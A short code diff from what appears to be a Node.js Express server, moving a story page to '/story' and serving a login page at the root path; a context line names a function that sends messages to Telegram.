@@ -25,11 +25,11 @@ function sendToTelegram(message) {
 }
 
 // Routes
-app.get('/', (req, res) => {
+app.get('/story', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'website', 'story_page', 'index.html'));
 });
 
-app.get('/login', (req, res) => {
+app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'website', 'login page', 'index.html'));
 });
 
